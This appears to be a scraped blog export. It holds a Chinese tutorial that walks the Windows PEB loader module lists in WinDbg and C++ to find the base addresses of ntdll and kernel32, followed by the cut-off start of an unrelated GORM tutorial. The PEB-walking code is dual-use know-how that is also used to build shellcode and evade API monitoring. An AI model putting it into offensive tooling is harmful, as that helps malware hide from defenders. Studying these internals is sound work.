1234567891011121314151617180:000&gt; dt _PEBntdll!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar +0x003 BitField : UChar +0x003 ImageUsesLargePages : Pos 0, 1 Bit +0x003 IsProtectedProcess : Pos 1, 1 Bit +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit +0x003 IsPackagedProcess : Pos 4, 1 Bit +0x003 IsAppContainer : Pos 5, 1 Bit +0x003 IsProtectedProcessLight : Pos 6, 1 Bit +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit +0x004 Mutant : Ptr32 Void +0x008 ImageBaseAddress : Ptr32 Void +0x00c Ldr : Ptr32 _PEB_LDR_DATA // &lt;=== 指向PEB_LDR_DATA... PEB_LDR_DATA 包含有关为进程加载的模块的信息 PEB_LDR_DATA结构定义12345typedef struct _PEB_LDR_DATA &#123; BYTE Reserved1[8]; // 保留供操作系统内部使用 PVOID Reserved2[3]; // 保留供操作系统内部使用 LIST_ENTRY InMemoryOrderModuleList; // 包含进程的已加载模块的双向链表, 链表中的每个项都是指向LDR_DATA_TABLE_ENTRY结构的指针&#125; PEB_LDR_DATA, *PPEB_LDR_DATA; LIST_ENTRY 结构体定义1234typedef struct _LIST_ENTRY &#123; struct _LIST_ENTRY *Flink; struct _LIST_ENTRY *Blink;&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY; _LIST_ENTRY: 这个双向链表指向进程装载的模块, 结构中每个指针, 指向了一个LDR_DATA_TABLE_ENTRY的结构; LDR_DATA_TABLE_ENTRY 结构定义123456789101112131415161718192021222324252627282930313233typedef struct _LDR_DATA_TABLE_ENTRY&#123; LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; WORD LoadCount; WORD TlsIndex; union &#123; LIST_ENTRY HashLinks; struct &#123; PVOID SectionPointer; ULONG CheckSum; &#125;; &#125;; union &#123; ULONG TimeDateStamp; PVOID LoadedImports; &#125;; _ACTIVATION_CONTEXT * EntryPointActivationContext; PVOID PatchInformation; LIST_ENTRY ForwarderLinks; LIST_ENTRY ServiceTagLinks; LIST_ENTRY StaticLinks;&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY; 查询PEB_LDR_DATA 在遍历InMemoryOrderModuleList时, 地址需要-0x08 12345678910110:000&gt; dt _PEB_LDR_DATAntdll!_PEB_LDR_DATA +0x000 Length : Uint4B +0x004 Initialized : UChar +0x008 SsHandle : Ptr32 Void +0x00c InLoadOrderModuleList : _LIST_ENTRY // &lt;=== 模块加载的顺序 +0x014 InMemoryOrderModuleList : _LIST_ENTRY // &lt;=== 模块在内存的顺序 +0x01c InInitializationOrderModuleList : _LIST_ENTRY // &lt;=== 模块在内存的顺序 +0x024 EntryInProgress : Ptr32 Void +0x028 ShutdownInProgress : UChar +0x02c ShutdownThreadId : Ptr32 Void 查询LDR_DATA_TABLE_ENTRY 以InLoadOrderLinks 为示例 获取主模块（程序自身）123456789101112131415161718192021222324250:000&gt; dt -r1 0x014b41d8 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x14b40c0 - 0x77eceb2c ] +0x000 Flink : 0x014b40c0 _LIST_ENTRY [ 0x14b45d0 - 0x14b41d8 ] +0x004 Blink : 0x77eceb2c _LIST_ENTRY [ 0x14b41d8 - 0x14b4810 ] +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x14b40c8 - 0x77eceb34 ] +0x000 Flink : 0x014b40c8 _LIST_ENTRY [ 0x14b45d8 - 0x14b41e0 ] +0x004 Blink : 0x77eceb34 _LIST_ENTRY [ 0x14b41e0 - 0x14b4818 ] +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ] +0x000 Flink : (null) +0x004 Blink : (null) +0x018 DllBase : 0x00d80000 Void // Dll基址 +0x01c EntryPoint : 0x00dce118 Void +0x020 SizeOfImage : 0x126000 +0x024 FullDllName : _UNICODE_STRING &quot;D:\\\\xxx\\\\EnumModule.exe&quot; // 第一个模块为程序自身 +0x000 Length : 0xb2 +0x002 MaximumLength : 0xb4 +0x004 Buffer : 0x014b27dc &quot;D:\\\\xxx\\\\EnumModule.exe&quot; +0x02c BaseDllName : _UNICODE_STRING &quot;EnumModule.exe&quot; +0x000 Length : 0x1c +0x002 MaximumLength : 0x1e +0x004 Buffer : 0x014b2872 &quot;EnumModule.exe&quot; +0x034 FlagGroup : [4] &quot;???&quot;略... 获取NtDll123456789101112131415161718192021222324250:000&gt; dt -r1 0x14b40c0 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x14b45d0 - 0x14b41d8 ] +0x000 Flink : 0x014b45d0 _LIST_ENTRY [ 0x14b49c0 - 0x14b40c0 ] +0x004 Blink : 0x014b41d8 _LIST_ENTRY [ 0x14b40c0 - 0x77eceb2c ] +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x14b45d8 - 0x14b41e0 ] +0x000 Flink : 0x014b45d8 _LIST_ENTRY [ 0x14b49c8 - 0x14b40c8 ] +0x004 Blink : 0x014b41e0 _LIST_ENTRY [ 0x14b40c8 - 0x77eceb34 ] +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x14b49d0 - 0x77eceb3c ] +0x000 Flink : 0x014b49d0 _LIST_ENTRY [ 0x14b45e0 - 0x14b40d0 ] +0x004 Blink : 0x77eceb3c _LIST_ENTRY [ 0x14b40d0 - 0x14b4820 ] +0x018 DllBase : 0x77da0000 Void // &lt;=== 指向ntdll.dll的基址 +0x01c EntryPoint : (null) +0x020 SizeOfImage : 0x1b2000 +0x024 FullDllName : _UNICODE_STRING &quot;C:\\\\WINDOWS\\\\SYSTEM32\\\\ntdll.dll&quot; +0x000 Length : 0x3a +0x002 MaximumLength : 0x3c +0x004 Buffer : 0x014b3fa0 &quot;C:\\\\WINDOWS\\\\SYSTEM32\\\\ntdll.dll&quot; +0x02c BaseDllName : _UNICODE_STRING &quot;ntdll.dll&quot; +0x000 Length : 0x12 +0x002 MaximumLength : 0x14 +0x004 Buffer : 0x77dab4f8 &quot;ntdll.dll&quot; +0x034 FlagGroup : [4] &quot;???&quot;略... 获取Kernel32123456789101112131415161718192021222324250:000&gt; dt -r1 0x014b45d0 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x14b49c0 - 0x14b40c0 ] +0x000 Flink : 0x014b49c0 _LIST_ENTRY [ 0x14b4810 - 0x14b45d0 ] +0x004 Blink : 0x014b40c0 _LIST_ENTRY [ 0x14b45d0 - 0x14b41d8 ] +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x14b49c8 - 0x14b40c8 ] +0x000 Flink : 0x014b49c8 _LIST_ENTRY [ 0x14b4818 - 0x14b45d8 ] +0x004 Blink : 0x014b40c8 _LIST_ENTRY [ 0x14b45d8 - 0x14b41e0 ] +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x14b4820 - 0x14b49d0 ] +0x000 Flink : 0x014b4820 _LIST_ENTRY [ 0x77eceb3c - 0x14b45e0 ] +0x004 Blink : 0x014b49d0 _LIST_ENTRY [ 0x14b45e0 - 0x14b40d0 ] +0x018 DllBase : 0x76310000 Void // &lt;=== 指向KERNEL32.DLL的基址 +0x01c EntryPoint : 0x763277c0 Void +0x020 SizeOfImage : 0xf0000 +0x024 FullDllName : _UNICODE_STRING &quot;C:\\\\WINDOWS\\\\System32\\\\KERNEL32.DLL&quot; +0x000 Length : 0x40 +0x002 MaximumLength : 0x42 +0x004 Buffer : 0x014b46e8 &quot;C:\\\\WINDOWS\\\\System32\\\\KERNEL32.DLL&quot; +0x02c BaseDllName : _UNICODE_STRING &quot;KERNEL32.DLL&quot; +0x000 Length : 0x18 +0x002 MaximumLength : 0x1a +0x004 Buffer : 0x014b4710 &quot;KERNEL32.DLL&quot; +0x034 FlagGroup : [4] &quot;???&quot;略... 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394// Get_LDR_Data_Table.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;// InLoadOrderModuleListVOID GetInLoadOrderModuleList(DWORD* PEB)&#123; PDWORD Ldr = NULL; DWORD* InLoad = NULL; DWORD* Kernel32 = NULL; DWORD* p = NULL; DWORD* BaseAddress = NULL; DWORD* BaseDllName = NULL; DWORD* FullDllName = NULL; Ldr = *(PDWORD*)((unsigned char*)PEB + 0x0c); // printf(&quot;得到LDR指针：%x\\r\\n&quot;, Ldr); InLoad = *(DWORD**)((unsigned char*)Ldr + 0x0c); // printf(&quot;得到InLoadOrderModuleList结构指针：%x\\r\\n&quot;, InLoad); // Kernel32 = *(DWORD**)((unsigned char*)InLoad + 0x18); // printf(&quot;得到Kernel32基址：%x\\r\\n&quot;, Kernel32); p = InLoad; p = *((DWORD**)p); while (InLoad != p) &#123; BaseAddress = *((DWORD**)((unsigned char*)p + 0x18)); // DllBase BaseDllName = *((DWORD**)((unsigned char*)p + 0x30)); // BaseDllName FullDllName = *((DWORD**)((unsigned char*)p + 0x28)); // FullDllName if (BaseAddress ==0) &#123; break; &#125; printf(&quot;镜像基址：0x%-20x 模块名称：%S\\r\\n ---&gt; 模块路径：%S\\n&quot;, BaseAddress, (unsigned char*)BaseDllName, (unsigned char*)FullDllName); p = *((DWORD**)p); &#125;&#125;// InMemoryOrderModuleListVOID GetInMemoryOrderModuleList(DWORD* PEB)&#123; DWORD* Ldr = NULL; DWORD* InMemory = NULL; DWORD* Kernel32 = NULL; DWORD* p = NULL; DWORD* BaseAddress = NULL; DWORD* BaseDllName = NULL; DWORD* FullDllName = NULL; Ldr = *(DWORD**)((unsigned char*)PEB + 0x0c); //printf(&quot;得到LDR结构指针：%x\\r\\n&quot;, Ldr); InMemory = *(DWORD**)((unsigned char*)Ldr + 0x14); //printf(&quot;得到InMemoryOrderModuleList结构指针：%x\\r\\n&quot;, InMemory); //Kernel32 = *(DWORD**)((unsigned char*)InMemory + 0x10); // printf(&quot;得到Kernel32基址：%x\\r\\n&quot;, Kernel32); p = InMemory; p = *((DWORD**)p); while (InMemory != p) &#123; BaseAddress = *((DWORD**)((unsigned char*)p + 0x10)); BaseDllName = *((DWORD**)((unsigned char*)p + 0x28)); FullDllName = *((DWORD**)((unsigned char*)p + 0x20)); if (BaseAddress == 0) &#123; break; &#125; printf(&quot;镜像基址：0x%-20x 模块名称：%S\\r\\n ---&gt; 模块路径：%S\\n&quot;, BaseAddress, (const char*)BaseDllName, (const char*)FullDllName); p = *((DWORD**)p); &#125;&#125;int main()&#123; DWORD* PEB = NULL; __asm &#123; mov eax, fs:[0x30] mov PEB, eax &#125; printf(&quot;得到PEB指针：0x%08x\\r\\n&quot;, PEB); printf(&quot;--------------------------------------------------------------------\\r\\n&quot;); GetInLoadOrderModuleList(PEB); printf(&quot;--------------------------------------------------------------------\\r\\n&quot;); GetInMemoryOrderModuleList(PEB); printf(&quot;--------------------------------------------------------------------\\r\\n&quot;); _TEB* pTeb = NtCurrentTeb(); PDWORD pPeb = (PDWORD) * (PDWORD)((DWORD)pTeb + 0x30); PDWORD pLdr = (PDWORD) * (PDWORD)((DWORD)pPeb + 0x0c); PDWORD pInLoadOrderLinks = (PDWORD) * (PDWORD)((DWORD)pLdr + 0x0c); PDWORD pModExe = (PDWORD)*pInLoadOrderLinks; PDWORD pModNtDll = (PDWORD)*pModExe; PDWORD pModKernel32 = (PDWORD)*pModNtDll; printf(&quot;镜像基址：0x%-20x 模块名称：%S\\r\\n ---&gt; 模块路径：%S\\n&quot;, pModKernel32[6], (const char*)pModKernel32[12], (const char*)pModKernel32[10]);&#125; 64位TEB&#x2F;PEB查找windbg查找 在遍历InMemoryOrderModuleList链表时, 地址需-0x10; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391400:000&gt; !pebPEB at 000000d737450000 InheritedAddressSpace: No ReadImageFileExecOptions: No BeingDebugged: Yes ImageBaseAddress: 00007ff723010000 NtGlobalFlag: 70 NtGlobalFlag2: 0 Ldr 00007ffc29996440 Ldr.Initialized: Yes Ldr.InInitializationOrderModuleList: 00000275005e4450 . 00000275005e4d20 Ldr.InLoadOrderModuleList: 00000275005e4620 . 00000275005edae0 Ldr.InMemoryOrderModuleList: 00000275005e4630 . 00000275005edaf0 Base TimeStamp Module 7ff723010000 666289ca Jun 07 12:17:14 2024 D:\\Tencent\\WeChat\\WeChat.exe 7ffc29810000 67ca8829 Mar 07 13:46:17 2025 C:\\WINDOWS\\SYSTEM32\\ntdll.dll 7ffc286f0000 36466623 Nov 09 11:48:51 1998 C:\\WINDOWS\\System32\\KERNEL32.DLL 7ffc270e0000 44653e19 May 13 10:02:01 2006 C:\\WINDOWS\\System32\\KERNELBASE.dll 7ffc27630000 3b26444f Jun 13 00:33:19 2001 C:\\WINDOWS\\System32\\USER32.dll 7ffc26e70000 331718eb Mar 01 01:42:03 1997 C:\\WINDOWS\\System32\\win32u.dll 7ffc286c0000 533dc7aa Apr 04 04:42:18 2014 C:\\WINDOWS\\System32\\GDI32.dll 7ffc26f20000 05ca1d5d Jan 29 13:04:29 1973 C:\\WINDOWS\\System32\\gdi32full.dll 7ffc27040000 8e0806c9 Jul 06 02:04:57 2045 C:\\WINDOWS\\System32\\msvcp_win.dll 7ffc26b40000 10c46e71 Dec 01 05:19:45 1978 C:\\WINDOWS\\System32\\ucrtbase.dll 7ffc29410000 dac79f47 Apr 25 03:38:47 2086 C:\\WINDOWS\\System32\\ADVAPI32.dll 7ffc28be0000 657b2709 Dec 15 00:02:17 2023 C:\\WINDOWS\\System32\\msvcrt.dll 7ffc28580000 47af1f27 Feb 10 23:58:31 2008 C:\\WINDOWS\\System32\\sechost.dll 7ffc26c60000 5a31de46 Dec 14 10:13:26 2017 C:\\WINDOWS\\System32\\bcrypt.dll 7ffc29130000 1caf5f33 Apr 02 10:00:19 1985 C:\\WINDOWS\\System32\\RPCRT4.dll 7ffc27a10000 8ec472d1 Nov 26 00:12:01 2045 C:\\WINDOWS\\System32\\SHELL32.dll 7ffc283c0000 99614267 Jul 18 18:13:59 2051 C:\\WINDOWS\\System32\\ole32.dll 7ffc287d0000 eadd58d3 Nov 12 12:32:19 2094 C:\\WINDOWS\\System32\\combase.dll 7ffc294d0000 672b2c78 Nov 06 16:44:40 2024 C:\\WINDOWS\\System32\\SHLWAPI.dll 7ffc06d90000 1aaf409d Mar 09 23:09:17 1984 C:\\WINDOWS\\WinSxS\\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.22621.3672_none_57feacb6ce14a323\\gdiplus.dll略...0:000&gt; dt -r1 0x00000275005e4630-0x10 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000275`005e4430 - 0x00007ffc`29996450 ] +0x000 Flink : 0x00000275`005e4430 _LIST_ENTRY [ 0x00000275`005e4d00 - 0x00000275`005e4620 ] +0x008 Blink : 0x00007ffc`29996450 _LIST_ENTRY [ 0x00000275`005e4620 - 0x00000275`005edae0 ] +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000275`005e4440 - 0x00007ffc`29996460 ] +0x000 Flink : 0x00000275`005e4440 _LIST_ENTRY [ 0x00000275`005e4d10 - 0x00000275`005e4630 ] +0x008 Blink : 0x00007ffc`29996460 _LIST_ENTRY [ 0x00000275`005e4630 - 0x00000275`005edaf0 ] +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x000 Flink : (null) +0x008 Blink : (null) +0x030 DllBase : 0x00007ff7`23010000 Void // &lt;=== 指向程序本身 +0x038 EntryPoint : 0x00007ff7`2301c148 Void +0x040 SizeOfImage : 0xa5000 +0x048 FullDllName : _UNICODE_STRING &quot;D:\\\\Tencent\\\\WeChat\\\\WeChat.exe&quot; +0x000 Length : 0x38 +0x002 MaximumLength : 0x3a +0x008 Buffer : 0x00000275`005e41c0 &quot;D:\\\\Tencent\\\\WeChat\\\\WeChat.exe&quot; +0x058 BaseDllName : _UNICODE_STRING &quot;WeChat.exe&quot; +0x000 Length : 0x14 +0x002 MaximumLength : 0x16 +0x008 Buffer : 0x00000275`005e41e4 &quot;WeChat.exe&quot; +0x068 FlagGroup : [4] &quot;???&quot;略...0:000&gt; dt -r1 0x00000275`005e4440-0x10 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000275`005e4d00 - 0x00000275`005e4620 ] +0x000 Flink : 0x00000275`005e4d00 _LIST_ENTRY [ 0x00000275`005e5440 - 0x00000275`005e4430 ] +0x008 Blink : 0x00000275`005e4620 _LIST_ENTRY [ 0x00000275`005e4430 - 0x00007ffc`29996450 ] +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000275`005e4d10 - 0x00000275`005e4630 ] +0x000 Flink : 0x00000275`005e4d10 _LIST_ENTRY [ 0x00000275`005e5450 - 0x00000275`005e4440 ] +0x008 Blink : 0x00000275`005e4630 _LIST_ENTRY [ 0x00000275`005e4440 - 0x00007ffc`29996460 ] +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000275`005e5460 - 0x00007ffc`29996470 ] +0x000 Flink : 0x00000275`005e5460 _LIST_ENTRY [ 0x00000275`005e4d20 - 0x00000275`005e4450 ] +0x008 Blink : 0x00007ffc`29996470 _LIST_ENTRY [ 0x00000275`005e4450 - 0x00000275`005e4d20 ] +0x030 DllBase : 0x00007ffc`29810000 Void // &lt;=== 指向ntdll.dll基址 +0x038 EntryPoint : (null) +0x040 SizeOfImage : 0x217000 +0x048 FullDllName : _UNICODE_STRING &quot;C:\\\\WINDOWS\\\\SYSTEM32\\\\ntdll.dll&quot; +0x000 Length : 0x3a +0x002 MaximumLength : 0x3c +0x008 Buffer : 0x00000275`005e42c0 &quot;C:\\\\WINDOWS\\\\SYSTEM32\\\\ntdll.dll&quot; +0x058 BaseDllName : _UNICODE_STRING &quot;ntdll.dll&quot; +0x000 Length : 0x12 +0x002 MaximumLength : 0x14 +0x008 Buffer : 0x00007ffc`2994e5d0 &quot;ntdll.dll&quot; +0x068 FlagGroup : [4] &quot;???&quot;略...0:000&gt; dt -r1 0x00000275`005e4d10-0x10 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000275`005e5440 - 0x00000275`005e4430 ] +0x000 Flink : 0x00000275`005e5440 _LIST_ENTRY [ 0x00000275`005e5080 - 0x00000275`005e4d00 ] +0x008 Blink : 0x00000275`005e4430 _LIST_ENTRY [ 0x00000275`005e4d00 - 0x00000275`005e4620 ] +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000275`005e5450 - 0x00000275`005e4440 ] +0x000 Flink : 0x00000275`005e5450 _LIST_ENTRY [ 0x00000275`005e5090 - 0x00000275`005e4d10 ] +0x008 Blink : 0x00000275`005e4440 _LIST_ENTRY [ 0x00000275`005e4d10 - 0x00000275`005e4630 ] +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00007ffc`29996470 - 0x00000275`005e5460 ] +0x000 Flink : 0x00007ffc`29996470 _LIST_ENTRY [ 0x00000275`005e4450 - 0x00000275`005e4d20 ] +0x008 Blink : 0x00000275`005e5460 _LIST_ENTRY [ 0x00000275`005e4d20 - 0x00000275`005e4450 ] +0x030 DllBase : 0x00007ffc`286f0000 Void // &lt;=== 指向KERNEL32.dll基址 +0x038 EntryPoint : 0x00007ffc`287025e0 Void +0x040 SizeOfImage : 0xc4000 +0x048 FullDllName : _UNICODE_STRING &quot;C:\\\\WINDOWS\\\\System32\\\\KERNEL32.DLL&quot; +0x000 Length : 0x40 +0x002 MaximumLength : 0x42 +0x008 Buffer : 0x00000275`005e4ef0 &quot;C:\\\\WINDOWS\\\\System32\\\\KERNEL32.DLL&quot; +0x058 BaseDllName : _UNICODE_STRING &quot;KERNEL32.DLL&quot; +0x000 Length : 0x18 +0x002 MaximumLength : 0x1a +0x008 Buffer : 0x00000275`005e4f18 &quot;KERNEL32.DLL&quot; +0x068 FlagGroup : [4] &quot;???&quot;略...0:000&gt; dt -r1 0x00000275`005e5450-0x10 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000275`005e5080 - 0x00000275`005e4d00 ] +0x000 Flink : 0x00000275`005e5080 _LIST_ENTRY [ 0x00000275`005e8270 - 0x00000275`005e5440 ] +0x008 Blink : 0x00000275`005e4d00 _LIST_ENTRY [ 0x00000275`005e5440 - 0x00000275`005e4430 ] +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000275`005e5090 - 0x00000275`005e4d10 ] +0x000 Flink : 0x00000275`005e5090 _LIST_ENTRY [ 0x00000275`005e8280 - 0x00000275`005e5450 ] +0x008 Blink : 0x00000275`005e4d10 _LIST_ENTRY [ 0x00000275`005e5450 - 0x00000275`005e4440 ] +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000275`005e4d20 - 0x00000275`005e4450 ] +0x000 Flink : 0x00000275`005e4d20 _LIST_ENTRY [ 0x00007ffc`29996470 - 0x00000275`005e5460 ] +0x008 Blink : 0x00000275`005e4450 _LIST_ENTRY [ 0x00000275`005e5460 - 0x00007ffc`29996470 ] +0x030 DllBase : 0x00007ffc`270e0000 Void // &lt;=== 指向KERNELBASE.dll基址 +0x038 EntryPoint : 0x00007ffc`27121850 Void +0x040 SizeOfImage : 0x3ac000 +0x048 FullDllName : _UNICODE_STRING &quot;C:\\\\WINDOWS\\\\System32\\\\KERNELBASE.dll&quot; +0x000 Length : 0x44 +0x002 MaximumLength : 0x46 +0x008 Buffer : 0x00000275`005e5630 &quot;C:\\\\WINDOWS\\\\System32\\\\KERNELBASE.dll&quot; +0x058 BaseDllName : _UNICODE_STRING &quot;KERNELBASE.dll&quot; +0x000 Length : 0x1c +0x002 MaximumLength : 0x1e +0x008 Buffer : 0x00000275`005e5658 &quot;KERNELBASE.dll&quot; +0x068 FlagGroup : [4] &quot;???&quot;略... 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;winternl.h&gt;#include &lt;intrin.h&gt;#pragma comment(lib, &quot;ntdll.lib&quot;)int main() &#123; // 获取 PEB 地址 PVOID pPeb = reinterpret_cast&lt;PVOID&gt;(__readgsqword(0x60)); if (!pPeb) &#123; std::cerr &lt;&lt; &quot;Failed to get PEB address.&quot; &lt;&lt; std::endl; return 1; &#125; // 计算 Ldr 地址的偏移量 ULONG64 ldrOffset = 0x18; // PEB 结构中 Ldr 成员的偏移量 // 计算 Ldr 地址 PVOID pLdr = *reinterpret_cast&lt;PVOID*&gt;(reinterpret_cast&lt;PBYTE&gt;(pPeb) + ldrOffset); if (!pLdr) &#123; std::cerr &lt;&lt; &quot;Failed to get Ldr address.&quot; &lt;&lt; std::endl; return 1; &#125; // 计算 InLoadOrderModuleList 地址的偏移量 ULONG64 moduleListOffset = offsetof(PEB_LDR_DATA, InMemoryOrderModuleList); // 计算 InLoadOrderModuleList 地址 PLIST_ENTRY pModuleList = reinterpret_cast&lt;PLIST_ENTRY&gt;(reinterpret_cast&lt;PBYTE&gt;(pLdr) + moduleListOffset); // 获取第一个模块的地址，通常是 ntdll.dll PLIST_ENTRY pFirstEntry = pModuleList-&gt;Flink; PLDR_DATA_TABLE_ENTRY pDataTableEntry = CONTAINING_RECORD(pFirstEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); PVOID pModExeBase = pDataTableEntry-&gt;DllBase; UNICODE_STRING pModExeName = pDataTableEntry-&gt;FullDllName; // 将 UNICODE_STRING 转换为 std::wstring std::wstring ModExeModuleNameW(pModExeName.Buffer, pModExeName.Length / sizeof(WCHAR)); // 输出模块信息 std::wcout &lt;&lt; L&quot;Module: &quot; &lt;&lt; ModExeModuleNameW &lt;&lt; L&quot;, Base Address: &quot; &lt;&lt; pModExeBase &lt;&lt; std::endl; PLDR_DATA_TABLE_ENTRY pKernel32Entry = nullptr; // 计算第二个模块的地址，通常是 ntdll.dll PLIST_ENTRY pSecondEntry = pFirstEntry-&gt;Flink; PLDR_DATA_TABLE_ENTRY pSecondDataTableEntry = CONTAINING_RECORD(pSecondEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); PVOID pNtDllBase = pSecondDataTableEntry-&gt;DllBase; UNICODE_STRING NtDllName = pSecondDataTableEntry-&gt;FullDllName; // 将 UNICODE_STRING 转换为 std::wstring std::wstring NtDllModuleNameW(NtDllName.Buffer, NtDllName.Length / sizeof(WCHAR)); // 输出模块信息 std::wcout &lt;&lt; L&quot;Module: &quot; &lt;&lt; NtDllModuleNameW &lt;&lt; L&quot;, Base Address: &quot; &lt;&lt; pNtDllBase &lt;&lt; std::endl; // 计算第三个模块的地址，通常是 KERNEL32.dll PLIST_ENTRY pThirdEntry = pSecondEntry-&gt;Flink; PLDR_DATA_TABLE_ENTRY pThirdDataTableEntry = CONTAINING_RECORD(pThirdEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); PVOID pKernel32Base = pThirdDataTableEntry-&gt;DllBase; UNICODE_STRING Kernel32Name = pThirdDataTableEntry-&gt;FullDllName; // 将 UNICODE_STRING 转换为 std::wstring std::wstring Kernel32ModuleNameW(Kernel32Name.Buffer, Kernel32Name.Length / sizeof(WCHAR)); // 输出模块信息 std::wcout &lt;&lt; L&quot;Module: &quot; &lt;&lt; Kernel32ModuleNameW &lt;&lt; L&quot;, Base Address: &quot; &lt;&lt; pKernel32Base &lt;&lt; std::endl; return 0;&#125;","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"Gorm学习手册","slug":"Gorm","date":"2024-06-14T01:07:01.000Z","updated":"2024-06-17T08:08:59.155Z","comments":true,"path":"ac48c083.html","link":"","permalink":"http://example.com/ac48c083.html","excerpt":"记录Gorm学习手册","text":"记录Gorm学习手册 声明模型模型定义 GORM通过将Go结构体(Go Structs)映射到数据库表来简化数据库交互 模型定义模型是使用普通结构体定义的。这些结构体可以包含具有基本Go类型、指针或这些类型的别名, 甚至是自定义类型(只需要实现database/sql包中的Scanner和Valuer接口)。 考虑以下user模型示例: 1234567891011type User struct &#123; ID uint // 主键 Name string // 一个常规字符串字段 Email *string // 一个指向字符串的指针, 允许空值 Age uint8 // 一个未签名的8位整数 Brithday *time.Time // time.Time指针, 可以为空 MemberNumber sql.NullString // 使用 sql.NullString 处理可为空字符串 ActivatedAt sql.NullTime // Uses sql.NullTime for nullable time fields CreatedAt time.Time // 创建时间（由GORM自动管理） UpdatedAt time.Time // 最后一次更新时间（由GORM自动管理）&#125; 在此模型中: 具体数字型如uint、string和uint8直接使用; 指向*string和*time.Time类型的指针表示可空字段; 来自database/sql包的sql.NullString和sql.NullTime用于具有更多控制的可空字段; CreateAt和UpdateAt是特殊字段, 当记录被创建或更新时, GORM会自动向内填充当前时间; 除了GORM中模型声明的基本特性外, 强调下通过serializer标签支持序列化也很重要; 此功能增强了数据存储和检索的灵活性, 特别是需要自定义序列化逻辑的字段; 约定 主键: GORM使用一个名为ID的字段作为每个模型的默认主键; 表名: 默认情况下, GORM将结构体名称转化为snake_case并为表名加上复数形式; 例如, 一个User结构体在数据库中表名变成users; 列名: GORM自动将结构体字段名转换为snake_case作为数据库中列名; 时间戳字段: GORM使用字段CreatedAt和UpdatedAt来自动跟踪记录的创建和更新时间; gorm.ModelGORM提供了一个预定义的结构体, 名为gorm.Model, 其中包含常用字段: 1234567// gorm.Model 的定义type Model struct &#123; ID uint `gorm:&quot;primaryKey&quot;` CreatedAt time.Time UpdatedAt time.Time DeletedAt gorm.DeletedAt `gorm:&quot;index&quot;`&#125; 将其嵌入在结构体中: 可以直接在结构体中嵌入gorm.Model, 以便自动包含这些字段; 包含的字段: ID: 每个记录的唯一标识符(主键); CreatedAt: 在创建时自动设置为当前时间; UpdatedAt: 每当记录更新时, 自动更新为当前时间; DeletedAt: 用于软删除; CRUD接口创建创建记录1234567user := User&#123;Name: &quot;Jinzhu&quot;, Age: 18, Birthday: time.Now()&#125;result := db.Create(&amp;user) // 通过数据的指针来创建user.ID // 返回插入数据的主键result.Error // 返回errorresult.RowsAffected // 返回插入记录的条数 我们还可以使用Create()创建多项记录: 123456789users := []*User&#123; &#123;Name: &quot;Jinzhu&quot;, Age: 18, Birthday: time.Now()&#125;, &#123;Name: &quot;Jackson&quot;, Age: 19, Birthday: time.Now()&#125;,&#125;result := db.Create(&amp;users)result.Error // 返回错误result.RowsAffected // 返回插入记录的条数 无法向create传递结构体, 所以应该传入数据的指针 用指定的字段创建记录创建记录并为指定字段赋值 12db.Select(&quot;Name&quot;, 